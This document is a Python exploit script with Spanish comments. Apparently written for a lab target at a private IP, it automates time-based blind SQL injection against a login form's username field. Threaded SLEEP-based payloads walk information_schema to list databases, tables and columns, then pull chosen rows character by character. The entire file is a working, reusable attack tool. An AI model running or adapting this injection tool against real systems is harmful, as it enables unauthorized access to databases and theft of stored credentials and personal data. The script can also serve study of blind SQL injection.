#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, threading

def def_handler(sig, frame):
    print("\n\n[!] Saliendo ....\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url = "http://10.88.0.2/login.php"
characters = 'etaoinshrdlucmfwypvbgkqjxz0123456789_-$ABCDEFGHIJKLMNOPQRSTUVWXYZ'  # orden de frecuencia
SLEEP_TIME = 2
THRESHOLD = 1.3
session = requests.Session()

def test_char(payload_template, index, position, char, result_holder):
    payload = payload_template.format(index=index, position=position, char=char)
    data = {
        'username': payload,
        'password': 'irrelevante'
    }

    start = time.time()
    session.post(url, data=data)
    end = time.time()

    if end - start > THRESHOLD:
        result_holder['char'] = char

def brute_extract(payload_template, label="EXTRACCIÓN", max_entries=20, max_length=30):
    results = []

    for entry_index in range(max_entries):
        entry_value = ""
        print(f"{label} #{entry_index}: ", end="", flush=True)
        for position in range(1, max_length + 1):
            result_holder = {'char': None}
            threads = []

            for char in characters:
                t = threading.Thread(target=test_char, args=(payload_template, entry_index, position, char, result_holder))
                threads.append(t)
                t.start()

            for t in threads:
                t.join()

            if result_holder['char']:
                entry_value += result_holder['char']
                print(result_holder['char'], end="", flush=True)
            else:
                break  # fin de cadena

        print()  # salto de línea al terminar la entrada

        if entry_value:
            results.append(entry_value)
        else:
            break  # no más entradas

    return results

def extract_databases():
    template = (
        "' OR IF(SUBSTRING((SELECT schema_name FROM information_schema.schemata "
        "LIMIT {index},1),{position},1)='{char}', SLEEP(2), 0)-- -"
    )
    return brute_extract(template, label="DB")

def extract_tables(database):
    template = (
        f"' OR IF(SUBSTRING((SELECT table_name FROM information_schema.tables "
        f"WHERE table_schema='{database}' LIMIT {{index}},1),{{position}},1)='{{char}}', SLEEP(2), 0)-- -"
    )
    return brute_extract(template, label=f"Tablas de {database}")

def extract_columns(database, table):
    template = (
        f"' OR IF(SUBSTRING((SELECT column_name FROM information_schema.columns "
        f"WHERE table_schema='{database}' AND table_name='{table}' LIMIT {{index}},1),{{position}},1)='{{char}}', SLEEP(2), 0)-- -"
    )
    return brute_extract(template, label=f"Columnas de {table}")

# Nueva función para extraer datos de columnas específicas en filas
def extract_data(database, table, columns, max_rows=10, max_length=30):
    results = []
    columns_str = ",".join(columns)
    for row_index in range(max_rows):
        row_value = ""
        print(f"Fila #{row_index}: ", end="", flush=True)
        for position in range(1, max_length + 1):
            result_holder = {'char': None}
            threads = []
            for char in characters + '|':  # incluimos '|' como posible carácter del separador
                payload = (
                    f"' OR IF(SUBSTRING((SELECT CONCAT_WS('|||',{columns_str}) FROM {database}.{table} "
                    f"LIMIT {row_index},1),{position},1)='{char}', SLEEP(2), 0)-- -"
                )
                t = threading.Thread(target=test_char, args=(payload, 0, 0, char, result_holder))
                threads.append(t)
                t.start()

            for t in threads:
                t.join()

            if result_holder['char']:
                row_value += result_holder['char']
                print(result_holder['char'], end="", flush=True)
            else:
                break

        print()
        if row_value:
            results.append(row_value)
        else:
            break
    return results

def main():
    log.info("Extrayendo nombres de bases de datos...")
    dbs = extract_databases()

    print("\n[+] Bases de datos encontradas:")
    for db in dbs:
        print(f" - {db}")

    target_db = input("\n[?] ¿Qué base de datos quieres explorar? ").strip()
    tbls = extract_tables(target_db)

    print(f"\n[+] Tablas en {target_db}:")
    for t in tbls:
        print(f" - {t}")

    target_tbl = input("\n[?] ¿Qué tabla quieres explorar? ").strip()
    cols = extract_columns(target_db, target_tbl)

    print(f"\n[+] Columnas en {target_tbl}:")
    for c in cols:
        print(f" - {c}")

    selected_cols = input("\n[?] ¿Qué columnas quieres extraer? (separa con coma) ").strip()
    selected_cols_list = [col.strip() for col in selected_cols.split(",") if col.strip() in cols]

    if not selected_cols_list:
        print("[!] No seleccionaste columnas válidas, saliendo...")
        return

    print(f"\n[+] Extrayendo datos de columnas: {', '.join(selected_cols_list)}")
    data_rows = extract_data(target_db, target_tbl, selected_cols_list)

    for i, row in enumerate(data_rows):
        values = row.split("|||")
        print(f"Fila #{i}:")
        for col, val in zip(selected_cols_list, values):
            print(f"  {col}: {val}")

if __name__ == '__main__':
    main()
